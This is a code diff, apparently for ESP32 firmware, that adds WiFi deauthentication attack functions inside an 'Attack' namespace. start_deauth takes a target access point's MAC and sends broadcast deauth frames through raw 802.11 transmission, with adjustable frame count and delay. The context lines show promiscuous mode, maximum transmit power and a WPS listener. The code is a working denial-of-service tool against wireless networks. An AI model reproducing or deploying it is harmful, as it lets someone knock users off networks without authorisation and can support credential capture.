@@ -16,8 +16,11 @@ wifi_config_t ap_config;
 esp_wps_config_t config;
 wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
 static bool wlan_status = false;
+static bool wlan_attack_status = false;
 static int timeout = 0; // milis
 static bool rate = false;
+static int deauth_delay = 50;
+static int deauth_count = 100;
 static std::vector<String> wps_data;
 
 // Deauth
@@ -305,6 +308,8 @@ namespace Attack
 {
     void Wifi::init()
     {
+        Serial.println("init");
+        wlan_attack_status = true;
         ap_config.ap.ssid_hidden = 1;
         ap_config.ap.beacon_interval = 10000;
         ap_config.ap.ssid_len = 0;
@@ -319,6 +324,31 @@ namespace Attack
 
         esp_wifi_set_promiscuous(true);
         esp_wifi_set_max_tx_power(82);
+    }
+
+    void Wifi::start_deauth(String mac_str, uint8_t channel)
+    {
+        //  куда = кто логика глушения перепутана местами куда в ff:ff... кто мак цели
+        String dst_mac = "ff:ff:ff:ff:ff:ff";
+        byte src_mac[6];
+        // byte src_mac[6] = {0x3E, 0x52, 0xA1, 0x1E, 0x09, 0xA1};
+        for (int i = 0; i < 6; i++)
+        {
+            src_mac[i] = strtoul(mac_str.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
+        }
+
+        if (!wlan_attack_status)
+            init();
+
+        send_deauth_frame(src_mac, channel, dst_mac);
+        delay(deauth_delay);
+        //  Serial.println(ieee80211_raw_frame_sanity_check(31337, 0, 0));
+    }
+
+    void Wifi::stop_deauth()
+    {
+        WiFi.mode(WIFI_MODE_NULL);
+        wlan_attack_status = false;
     }
 
     void Wifi::send_deauth_frame(uint8_t bssid[6], int channel, String dst_mac_str)
@@ -409,6 +439,28 @@ namespace Attack
         esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
         esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
         esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
+    }
+
+    void Wifi::set_deauth_count(int count)
+    {
+        Serial.println(count);
+        deauth_count = count;
+    }
+
+    void Wifi::set_deauth_delay(int timeout)
+    {
+        Serial.println(timeout);
+        deauth_delay = timeout;
+    }
+
+    int Wifi::get_deauth_count()
+    {
+        return deauth_count;
+    }
+
+    int Wifi::get_deauth_delay()
+    {
+        return deauth_delay;
     }
 
     void Wifi::wps_listner()
